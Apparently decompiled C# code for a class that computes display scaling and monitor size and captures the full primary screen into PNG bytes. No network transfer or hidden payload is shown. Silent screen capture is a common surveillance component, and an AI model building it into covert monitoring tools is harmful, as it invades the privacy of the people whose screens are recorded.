using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;

// Token: 0x0200003C RID: 60
public static class Resolution
{
	// Token: 0x06000132 RID: 306
	[DllImport("gdi32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDeviceCaps(IntPtr hDC, int nIndex);

	// Token: 0x06000133 RID: 307 RVA: 0x0000A9BC File Offset: 0x00008BBC
	public static double GetWindowsScreenScalingFactor(bool percentage = true)
	{
		Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);
		IntPtr hdc = graphics.GetHdc();
		int deviceCaps = Resolution.GetDeviceCaps(hdc, 10);
		double num = Math.Round((double)Resolution.GetDeviceCaps(hdc, 117) / (double)deviceCaps, 2);
		if (percentage)
		{
			num *= 100.0;
		}
		graphics.ReleaseHdc(hdc);
		graphics.Dispose();
		return num;
	}

	// Token: 0x06000134 RID: 308 RVA: 0x0000AA14 File Offset: 0x00008C14
	[return: Dynamic]
	public static dynamic MonitorSize()
	{
		object result;
		try
		{
			double windowsScreenScalingFactor = Resolution.GetWindowsScreenScalingFactor(false);
			int num = (int)((double)Screen.PrimaryScreen.Bounds.Width * windowsScreenScalingFactor);
			double num2 = (double)Screen.PrimaryScreen.Bounds.Height * windowsScreenScalingFactor;
			result = new Size(num, (int)num2);
		}
		catch
		{
			result = Screen.PrimaryScreen.Bounds.Size;
		}
		return result;
	}

	public static byte[] Print()
	{
		try
		{
			dynamic val = MonitorSize();
			Bitmap bitmap = new Bitmap(val.Width, val.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.InterpolationMode = InterpolationMode.Bicubic;
				graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
				graphics.SmoothingMode = SmoothingMode.HighSpeed;
				graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), val);
			}
			return ConvertToBytes(bitmap);
		}
		catch (Exception)
		{
			return null;
		}
	}

	// Token: 0x06000136 RID: 310 RVA: 0x0000AC88 File Offset: 0x00008E88
	private static byte[] ConvertToBytes(Image img)
	{
		byte[] result;
		try
		{
			if (img == null)
			{
				result = null;
			}
			else
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					img.Save(memoryStream, ImageFormat.Png);
					result = memoryStream.ToArray();
				}
			}
		}
		catch (Exception)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x0200003D RID: 61
	public enum DeviceCap
	{
		// Token: 0x04000037 RID: 55
		VERTRES = 10,
		// Token: 0x04000038 RID: 56
		DESKTOPVERTRES = 117
	}
}
